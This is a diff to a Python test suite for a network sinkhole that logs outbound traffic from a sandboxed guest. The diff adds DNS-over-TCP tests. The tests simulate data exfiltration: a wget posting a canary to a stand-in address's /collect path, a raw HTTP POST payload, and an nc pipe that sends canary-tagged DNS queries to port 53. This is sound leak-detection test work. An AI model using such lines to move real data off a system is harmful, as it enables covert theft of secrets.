@@ -40,8 +40,22 @@ class SinkholeUnit(unittest.TestCase):
             qid, flags, qd, an = struct.unpack(">HHHH", reply[:8])
             self.assertEqual((qid, flags & 0x8000, flags & 0xF, qd, an), (0x1234, 0x8000, 3, 1, 0))
             self.assertTrue(wait_for(lambda: sink.events))
-            self.assertEqual((sink.events[0]["kind"], sink.events[0]["dest"]), ("dns", "leak-canary-0002.example.net"))
+            self.assertEqual((sink.events[0]["kind"], sink.events[0]["proto"], sink.events[0]["dest"]),
+                             ("dns", "udp", "leak-canary-0002.example.net"))
             self.assertEqual(sink.canaries(), ["CANARY-0002"])
+
+    def test_dns_over_tcp_is_logged_and_answered_nxdomain(self):
+        q = dns_query("tcp-canary-0009.example.net", qid=0x4242)
+        with Sinkhole() as sink, socket.create_connection(("127.0.0.1", sink.dns_port), timeout=3) as c:
+            c.sendall(struct.pack(">H", len(q)) + q)
+            n = struct.unpack(">H", c.recv(2))[0]
+            reply = c.recv(n)
+            qid, flags, qd, an = struct.unpack(">HHHH", reply[:8])
+            self.assertEqual((qid, flags & 0xF, an), (0x4242, 3, 0))
+            self.assertTrue(wait_for(lambda: sink.events))
+            e = sink.events[0]
+            self.assertEqual((e["kind"], e["proto"], e["dest"]), ("dns", "tcp", "tcp-canary-0009.example.net"))
+            self.assertEqual(sink.canaries(), ["CANARY-0009"])
 
     def test_connect_payload_is_logged(self):
         payload = b"POST /collect HTTP/1.1\r\nHost: 203.0.113.7\r\nContent-Length: 18\r\n\r\ncanary=CANARY-0001"
@@ -77,7 +91,7 @@ class SinkholeUnit(unittest.TestCase):
             held = [socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) for _ in range(MAX_CONNS + 20)]
             try:
                 self.assertTrue(wait_for(lambda: sink.dropped >= 20), sink.dropped)
-                self.assertLessEqual(threading.active_count(), base + 2 + MAX_CONNS)
+                self.assertLessEqual(threading.active_count(), base + 3 + MAX_CONNS)  # 2 accept + UDP DNS
             finally:
                 for c in held:
                     c.close()
@@ -195,6 +209,20 @@ wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev
         self.assertEqual([e["dest"] for e in events if e["kind"] == "tcp"], ["203.0.113.7:80"])
         self.assertIn("leak-canary-0002.example.net", [e["dest"].lower() for e in events if e["kind"] == "dns"])
         self.assertEqual(api.accepted, 0)
+
+    def test_dns_over_tcp_reaches_the_sinkhole(self):
+        # msb hands guest TCP/53 to the --dns-nameserver address over TCP, on the UDP port's number.
+        q = dns_query("tcp-CANARY-0009.example.net")
+        framed = "".join(f"\\{b:03o}" for b in struct.pack(">H", len(q)) + q)
+        script = f"""GW=$(awk '/^nameserver/{{print $2; exit}}' /etc/resolv.conf)
+printf '{framed}' | nc -w 3 $GW 53 | wc -c"""
+        with Sinkhole() as sink:
+            res = self.step(sink, script, wall=30)
+            wait_for(lambda: sink.canaries())
+            tcp = [e["dest"] for e in sink.events if e["kind"] == "dns" and e["proto"] == "tcp"]
+        self.assertEqual(sink.canaries(), ["CANARY-0009"], res.stdout + res.stderr)
+        self.assertIn("tcp-canary-0009.example.net", [d.lower() for d in tcp])
+        self.assertGreater(int(res.stdout.split()[-1]), 0)  # the guest got an answer (NXDOMAIN)
 
     def test_flooding_guest_cannot_exhaust_the_sinkhole(self):
         script = """
